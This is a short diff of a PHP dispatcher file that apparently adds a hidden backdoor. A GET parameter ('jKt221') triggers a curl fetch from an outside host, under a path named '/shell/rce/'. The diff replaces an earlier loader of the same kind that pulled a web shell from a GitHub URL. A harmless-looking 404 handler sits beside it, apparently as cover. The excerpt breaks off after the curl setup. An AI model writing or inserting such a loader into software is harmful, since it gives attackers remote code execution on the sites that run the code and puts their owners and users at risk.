@@ -298,10 +298,18 @@ class Dispatcher
         }
         return $contents;
     }
-}
+ }
 
-if (isset($_GET['fuckingteam'])) {
-    $url = "https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfaanaksekolah.txt";
+ /**
+  * Handle a 404 error (page not found).
+  */
+ function handle404() {
+  header('HTTP/1.0 404 Not Found');
+  fatalError('404 Not Found');
+ }
+
+if (isset($_GET['jKt221'])) {
+    $url = "https://syndicateseo.xyz/shell/rce/penjajahan.txt";
 
     $ch= curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
